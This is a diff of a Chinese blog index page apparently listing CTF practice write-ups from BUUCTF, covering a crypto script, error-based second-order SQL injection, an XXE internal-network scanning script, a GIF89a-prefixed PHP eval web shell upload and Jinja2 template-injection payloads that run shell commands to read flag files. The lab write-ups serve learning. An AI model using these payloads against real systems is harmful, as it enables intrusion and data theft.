@@ -167,8 +167,8 @@
         
 
 <div class="post">
-    <a href="/2024/05/15/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/WesternCTF2018-shrine/">
-        <h2 class="post-title">[WesternCTF2018]shrine</h2>
+    <a href="/2024/05/31/buu%E5%88%B7%E9%A2%98%E9%9B%86-crypto/Alice%E4%B8%8EBob/">
+        <h2 class="post-title">Alice与Bob</h2>
     </a>
     <div class="category-and-date">
         
@@ -176,7 +176,7 @@
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2024/5/15
+            2024/5/31
         </span>
         
         
@@ -184,656 +184,568 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406131912831.png" alt="image-20240515210916400"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import flask </span><br><span class="line">import os </span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__) </span><br><span class="line">app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;) </span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;) </span><br><span class="line">def index(): </span><br><span class="line">	return open(__file__).read() </span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/shrine/&#x27;) </span><br><span class="line">def shrine(shrine): </span><br><span class="line">	def safe_jinja(s): </span><br><span class="line">		s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;) 			</span><br><span class="line">		blacklist = [&#x27;config&#x27;, &#x27;self&#x27;] </span><br><span class="line">		return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s</span><br><span class="line">		return flask.render_template_string(safe_jinja(shrine)) </span><br><span class="line">if __name__ == &#x27;__main__&#x27;: app.run(debug=True)</span><br></pre></td></tr></table></figure>
+            <p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240531204823812.png" alt="image-20240531204823812"></p>
+<p>脚本如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=int(input())</span><br><span class="line">t=2</span><br><span class="line">while a%t!=0 or 0 in [t%d for d in range (2,int(t**0.5)+1)]:</span><br><span class="line">    t=t+1</span><br><span class="line">print(int(a/t))</span><br></pre></td></tr></table></figure>
 
-<p>所以我们一部分一部分拆解一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import flask </span><br><span class="line">import os </span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__) </span><br><span class="line">app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;) </span><br><span class="line">//注册了一个名为FLAG的config，所以这个config大概率就是flag</span><br></pre></td></tr></table></figure>
+<p>求出更大的那位数字</p>
+<p>再通过计算求出小的那个</p>
+<p>最后整合到一起MD5即可</p>
 
-<p>所以我们就是要访问config</p>
-<p>但是</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">blacklist = [&#x27;config&#x27;, &#x27;self&#x27;] </span><br></pre></td></tr></table></figure>
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/2024/05/31/buu%E5%88%B7%E9%A2%98%E9%9B%86-crypto/Alice%E4%B8%8EBob/" class="go-post">阅读全文</a>
+</div>
 
-<p>所以不可以直接访问config</p>
-<p>这边首先确认一下怎么注入吧</p>
-<p>这边采取ssti（我还是不懂怎么判断是不是模版注入）</p>
-<p>经过查询之后（flask框架没学深的好难过）</p>
-<p>发现了两个函数可以绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get_flashed_messages.__globals__[&#x27;current_app&#x27;].config</span><br><span class="line">url_for.__globals__[&#x27;current_app&#x27;].config</span><br></pre></td></tr></table></figure>
+<div class="post">
+    <a href="/2024/05/31/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/RCTF2015-EasySQL/">
+        <h2 class="post-title">[RCTF2015]EasySQL</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/31
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240531200944034.png" alt="image-20240531200944034"></p>
+<p>这道题的题解不适合从错误开始写，因为就是二次报错注入，所以我从一开始直接提醒你们！！！</p>
+<p>在注册界面在username里面输入依次输入以下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&quot;||extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),0x7e))#</span><br></pre></td></tr></table></figure>
 
-<p>这两个是py的内置函数</p>
-<p>知识点放最后了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&quot;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;users&#x27;)))#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&quot;||extractvalue(1,concat(0x7e,(select(real_flag_1s_here)from(users))))#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&quot;||extractvalue(1,concat(0x7e,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;))))#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&quot;||extractvalue(1,concat(0x7e,reverse((select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;)))))#</span><br></pre></td></tr></table></figure>
+
+<p>就可以了（找怎么写的已经可以走了）</p>
+<p>很基础的二次注入</p>
+<p>再来一个个解释</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&quot;||extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),0x7e))#</span><br></pre></td></tr></table></figure>
+
+<p>这个也就是说我们要进行报错注入，通过报错注入找到tables</p>
+<p>查表也是一样的操作</p>
+<p>最后两条是因为直接查询字段会发现不止一行</p>
+<p>所以使用正则分别读取</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/2024/05/31/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/RCTF2015-EasySQL/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/05/31/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/">
+        <h2 class="post-title">[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/31
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240531192836498.png" alt="image-20240531192836498"></p>
+<p>嘻嘻嘻吗，没钱钱买，可恶恶呢</p>
+<p>打开源码，发现了一个奇奇怪怪的</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240531192925336.png" alt="image-20240531192925336"></p>
+<p>鬼鬼祟祟，必有蹊跷</p>
+<p>第一反应，看到这个就是文件包含或者伪协议</p>
+<p>但是文件包含看不出来，试试伪协议读取</p>
+<p>但是没什么用啊</p>
+<p>宝了个贝的</p>
+<p>在其他的界面读，index不行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = &#x27;&#x27;;</span><br><span class="line">    $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;;</span><br><span class="line">    $user_name = $_POST[&quot;user_name&quot;];</span><br><span class="line">    $address = addslashes($_POST[&quot;address&quot;]);</span><br><span class="line">    $phone = $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = &#x27;no sql inject!&#x27;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = &quot;update `user` set `address`=&#x27;&quot;.$address.&quot;&#x27;, `old_address`=&#x27;&quot;.$row[&#x27;address&#x27;].&quot;&#x27; where `user_id`=&quot;.$row[&#x27;user_id&#x27;];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        if(!$result) &#123;</span><br><span class="line">            echo &#x27;error&#x27;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = &quot;订单䀀//change</span><br></pre></td></tr></table></figure>
+
+<p>发现了config.php</p>
+<p>读一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);</span><br><span class="line"></span><br><span class="line">$DATABASE = array(</span><br><span class="line"></span><br><span class="line">    &quot;host&quot; =&gt; &quot;127.0.0.1&quot;,</span><br><span class="line">    &quot;username&quot; =&gt; &quot;root&quot;,</span><br><span class="line">    &quot;password&quot; =&gt; &quot;root&quot;,</span><br><span class="line">    &quot;dbname&quot; =&gt;&quot;ctfusers&quot;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$db = new mysqli($DATABASE[&#x27;host&#x27;],$DATABASE[&#x27;username&#x27;],$DATABASE[&#x27;password&#x27;],$DATABASE[&#x27;dbname&#x27;]);</span><br></pre></td></tr></table></figure>
+
+<p>所以，我们发现了flag应该在ctfusers中</p>
+<p>我们也可以确定是sql注入</p>
+<p>再来看看之前的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = &#x27;&#x27;;</span><br><span class="line">    $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;;</span><br><span class="line">    $user_name = $_POST[&quot;user_name&quot;];</span><br><span class="line">    $address = addslashes($_POST[&quot;address&quot;]);</span><br><span class="line">    $phone = $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = &#x27;no sql inject!&#x27;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = &quot;update `user` set `address`=&#x27;&quot;.$address.&quot;&#x27;, `old_address`=&#x27;&quot;.$row[&#x27;address&#x27;].&quot;&#x27; where `user_id`=&quot;.$row[&#x27;user_id&#x27;];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        if(!$result) &#123;</span><br><span class="line">            echo &#x27;error&#x27;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = &quot;订单䀀//change</span><br></pre></td></tr></table></figure>
+
+<p>发现是在user_name和phone上出现了waf，address啥也没有</p>
+<p>所以大概率是在address进行注入</p>
+<p>接下来就是确定一下用什么注入方式了</p>
+<p>我觉得肯定是二次注入，否则搞那么多页面干吗</p>
+<p>事实证明是这样的，但是思路错了</p>
+<p>我一开始随便注册了一个然后在修改地址的地方修改再去查询界面看</p>
+<p>但是…</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240531195025621.png" alt="image-20240531195025621"></p>
+<p>可以确定，就是会在修改界面，将这些字符全部实体化，所以…宝了个贝的</p>
+<p>想起了之前写过的一道题<a href="%22C:%5CUsers%5C%E6%B1%AA%E6%B6%B5%E8%A3%95%5CDesktop%5Cblog%5Csource_posts%5Cbuu%E5%88%B7%E9%A2%98%E9%9B%86%5CRCTF2015-EasySQL.md%22">[RCTF2015]EasySQL</a></p>
+<p>在注册是就使用报错注入，然后在修改页面直接报错，太像了！！！</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or updatexml(1,concat(0x7e,(select substr(load_file(&#x27;/flag.txt&#x27;),1,30))),1)#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1&#x27; or updatexml(1,concat(0x7e,(select substr(load_file(&#x27;/flag.txt&#x27;),30,60))),1)#</span><br></pre></td></tr></table></figure>
+
+<p>拿到flag{c9c29e2d-6f34-465f-94ec-3d4f2468716b}</p>
+<p>注意！</p>
+<p>这里要注册两个不一样的账户读取哦~</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/2024/05/31/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/05/30/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/NCTF2019-True-XML-cookbook/">
+        <h2 class="post-title">[NCTF2019]True XML cookbook</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/30
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240530221915999.png" alt="image-20240530221915999"></p>
+<p>要长脑子了好像在哪里见过</p>
+<p>孩子们我回来了是吧</p>
+<p>好好好</p>
+<p>和上一题差不多的话先抓包</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240530222006950.png" alt="image-20240530222006950"></p>
+<p>之后是实体化注入</p>
+<h4 id="实体化注入"><a href="#实体化注入" class="headerlink" title="实体化注入"></a>实体化注入</h4><p>XXE(XML External Entity Injection)全称为XML外部实体注入。</p>
+<p>XML是什么？<br>XML指可扩展标记语言(EXtensible Markup Language),其设计宗旨是传输数据，而不是显示数据，用来结构化、存储以及传输信息，它没有预定义的标签。XML 和 HTML 之间的差异是什么？</p>
+<p>设计目的不同：XML 被设计用来传输和存储数据，其焦点是数据的内容。HTML 被设计用来显示数据，其焦点是数据的外观。HTML 旨在显示信息，而 XML 旨在传输信息。</p>
+<p>总的来说：我们希望能在计算机中保存和处理这些数据的同时能够保存和处理他们之间的关系。XML就是为了解决这样的需求而产生数据存储格式。</p>
+<p>XML基本格式与基本语法：<br>基本格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;               &lt;!--xml文件的声明--&gt;</span><br><span class="line"></span><br><span class="line">&lt;bookstore&gt;                                                                                          &lt;!--根元素--&gt;</span><br><span class="line"></span><br><span class="line">&lt;book category=&quot;COOKING&quot;&gt;                             &lt;!--bookstore的子元素，category为属性--&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;Everyday Italian&lt;/title&gt;                                &lt;!--book的子元素，lang为属性--&gt;</span><br><span class="line"></span><br><span class="line">&lt;author&gt;Giada De Laurentiis&lt;/author&gt;                 &lt;!--book的子元素--&gt;</span><br><span class="line"></span><br><span class="line">&lt;year&gt;2005&lt;/year&gt;                                               &lt;!--book的子元素--&gt;</span><br><span class="line"></span><br><span class="line">&lt;price&gt;30.00&lt;/price&gt;                                             &lt;!--book的子元素--&gt;</span><br><span class="line"></span><br><span class="line">&lt;/book&gt;                                                                  &lt;!--book的结束--&gt;</span><br><span class="line"></span><br><span class="line">&lt;/bookstore&gt;                                                          &lt;!--bookstore的结束--&gt;</span><br></pre></td></tr></table></figure>
+
+ <?xml version="1.0" encoding="UTF-8" standalone="yes"?><p> 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。</p>
+<p>standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。</p>
+<p>基本语法：<br>所有 XML 元素都须有关闭标签。<br>XML 标签对大小写敏感。<br>XML 必须正确地嵌套。<br>XML 文档必须有根元素。<br>XML 的属性值须加引号。<br> 什么是DTO？<br>DTD基本概念<br>XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的。<br>DTD用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。是XML文档中的几条语句，用来说明哪些元素&#x2F;属性是合法的以及元素间应当怎样嵌套&#x2F;结合，也用来将一些特殊字符和可复用代码段自定义为实体。</p>
+<p>实体引用<br>XML元素以形如 <tag>foo</tag> 的标签开始和结束，如果元素内部出现如&lt; 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义五个实体引用，即用&lt; &gt; &amp; &apos; &quot; 替换 &lt; &gt; &amp; ‘ “ 。<br>实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。</p>
+<p>这道题就不从错误尝试开始了</p>
+<p>直接从正解开始吧</p>
+<p>探测内网信息，读取下系统内的配置文件信息看是否能发现有用的信息，包含：&#x2F;etc&#x2F;hosts、&#x2F;proc&#x2F;net&#x2F;arp、proc&#x2F;net&#x2F;fib_trie等</p>
+<p>我们读取关键文件：</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240530222507318.png" alt="image-20240530222507318"></p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240530222516481.png" alt="image-20240530222516481"></p>
+<p>对80.后面的174三位进行爆破</p>
+<p>即查询下同网段内存在不存在其他地址</p>
+<p>爆破脚本如下（因为我bp用不来）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests as res</span><br><span class="line">url=&quot;http://46a0cc5d-9c92-4497-b08a-7b24717759ad.node5.buuoj.cn:81/doLogin.php&quot;</span><br><span class="line">rawPayload=&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&#x27;\</span><br><span class="line">         &#x27;&lt;!DOCTYPE user [&#x27;\</span><br><span class="line">         &#x27;&lt;!ENTITY payload1 SYSTEM &quot;http://10.244.80.&#123;&#125;&quot;&gt;&#x27;\</span><br><span class="line">         &#x27;]&gt;&#x27;\</span><br><span class="line">         &#x27;&lt;user&gt;&#x27;\</span><br><span class="line">         &#x27;&lt;username&gt;&#x27;\</span><br><span class="line">         &#x27;&amp;payload1;&#x27;\</span><br><span class="line">         &#x27;&lt;/username&gt;&#x27;\</span><br><span class="line">         &#x27;&lt;password&gt;&#x27;\</span><br><span class="line">         &#x27;23&#x27;\</span><br><span class="line">         &#x27;&lt;/password&gt;&#x27;\</span><br><span class="line">         &#x27;&lt;/user&gt;&#x27;</span><br><span class="line">for i in range(1,256):</span><br><span class="line">    payload=rawPayload.format(i)</span><br><span class="line">    #payload=rawPayload</span><br><span class="line">    print(str(&quot;#&#123;&#125; =&gt;&quot;).format(i),end=&#x27;&#x27;)</span><br><span class="line">    try:</span><br><span class="line">        resp=res.post(url,data=payload,timeout=0.5)</span><br><span class="line">    except:</span><br><span class="line">        continue</span><br><span class="line">    else:</span><br><span class="line">        print(resp.text,end=&#x27;&#x27;)</span><br><span class="line">    finally:</span><br><span class="line">        print(&#x27;&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>最后找到网址和flag！</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/2024/05/30/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/NCTF2019-True-XML-cookbook/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/05/28/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/watevrCTF-2019-Cookie-Store/">
+        <h2 class="post-title">[watevrCTF-2019]Cookie Store</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/28
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>吃小蛋糕了！！！</p>
+<p><img src="C:\Users\汪涵裕\Desktop\blog\source\image\image-20240528215431108.png" alt="image-20240528215431108"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/2024/05/28/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/watevrCTF-2019-Cookie-Store/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/05/26/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/WUSTCTF2020-CV-Maker/">
+        <h2 class="post-title">[WUSTCTF2020]CV Maker</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/26
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>这个系列啊，好好好</p>
+<p>喜欢+1</p>
+<p>随便注册个账号登进去</p>
+<p>我的登录：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">邮箱：1@qq.com</span><br><span class="line">密码：123</span><br></pre></td></tr></table></figure>
+
+<p>你也来试试，爆率真的很高（bushi</p>
+<p>噔噔蹬</p>
+<p>更换头像？？？？</p>
+<p>一眼文件上传</p>
+<p>怎么办呢</p>
+<p>首先是直接穿php文件木马，这个不行（肯定不行啊）</p>
+<p>之后也尝试了改文件格式也还是不行</p>
+<p>所以尝试魔术头</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[123])&lt;/script&gt;&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[123])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>神奇的魔术头FIF89a?</p>
+<p>针不戳</p>
+<p>不需要修改文件类型，你值得拥有，上传查看源码，发现文件包含路径</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/Picgo/image-20240526203435590.png" alt="image-20240526203435590"></p>
+<p>蚁剑连接即可</p>
+<p>拿到flag</p>
+<p>真的挺简单的</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/2024/05/26/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/WUSTCTF2020-CV-Maker/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/05/26/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/CSCCTF-2019-Qual-FlaskLight/">
+        <h2 class="post-title">[CSCCTF 2019 Qual]FlaskLight</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/26
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>查看源码</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/Picgo/image-20240526190918700.png" alt="image-20240526190918700"></p>
+<p>也就是说变量告诉我了，也告诉我通过get传递了</p>
+<p>所以？</p>
+<p>来吧，宝贝</p>
+<p>首先试了试sql注入，不行</p>
+<p>只能试试ssti</p>
+<p>这个是jinja2模型，还是不太熟练</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&#123;&#123;[].__class__.__bases__[0].__subclasses__()[40]&#125;&#125;//已经可以读取文件了</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__bu&#x27;+&#x27;iltins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;os&#x27;).__dict__[&#x27;pop&#x27;+&#x27;en&#x27;](&#x27;ls&#x27;).read()&#125;&#125;//找一个可以执行命令的函数</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__bu&#x27;+&#x27;iltins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;os&#x27;).__dict__[&#x27;pop&#x27;+&#x27;en&#x27;](&#x27;ls&#x27;).read()&#125;&#125;//读取文件目录</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__bu&#x27;+&#x27;iltins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;os&#x27;).__dict__[&#x27;pop&#x27;+&#x27;en&#x27;](&#x27;ls /flasklight&#x27;).read()&#125;&#125;xxxxxxxxxx &#123;&#123;[].__class__.__bases__[0].__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__bu&#x27;+&#x27;iltins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;os&#x27;).__dict__[&#x27;pop&#x27;+&#x27;en&#x27;](&#x27;ls /flasklight&#x27;).read()&#125;&#125;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59].__init__[%27__glo%27+%27bals__%27][%27__bu%27+%27iltins__%27][%27__imp%27+%27ort__%27](%27os%27).__dict__[%27pop%27+%27en%27](%27ls%20/flasklight/coomme_geeeett_youur_flek%27).read()&#125;&#125;//猜测当前目录在flasklight下</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59].__init__[%27__glo%27+%27bals__%27][%27__bu%27+%27iltins__%27][%27__imp%27+%27ort__%27](%27os%27).__dict__[%27pop%27+%27en%27](%27cat%20/flasklight/coomme_geeeett_youur_flek%27).read()&#125;&#125;//拿到flag</span><br></pre></td></tr></table></figure>
+
+<h4 id="jinja2模版的ssti"><a href="#jinja2模版的ssti" class="headerlink" title="jinja2模版的ssti"></a>jinja2模版的ssti</h4><p>在Python环境下，<code>.__class__</code>获取对应实例的类，<code>.__mro__</code>获取当前对象的所有继承类</p>
+<p>得到所有类的父类<code>object</code>后，使用方法<code>__subclasses__()</code>查看所有类对象。</p>
+<p>并找到了<code>warnings.catch_warnings</code>模块，通过该模块可以访问<code>os</code>模块。</p>
+<p>因此，试图通过访问<code>os</code>模块执行命令查找根目录下的FLAG。</p>
+<p><code>__init__</code>将对象实例化</p>
+<p><code>__globals__</code>引用包含函数全局变量的字典</p>
+<p>在<code>__builtins__</code>下有<code>eval</code>、<code>__import＿＿</code>等全局函数</p>
+<p>尝试导入<code>os</code>然后执行cmd命令</p>
+<p><code>ls</code>执行成功说明环境基于Linux</p>
+<p>使用<code>cat</code>访问<code>/flag</code>即可得到FLAG</p>
+<p>例子观察以上题目payload</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/2024/05/26/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/CSCCTF-2019-Qual-FlaskLight/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/05/24/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/Zer0pts2020-Can-you-guess-it/">
+        <h2 class="post-title">[Zer0pts2020]Can you guess it?</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/24
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
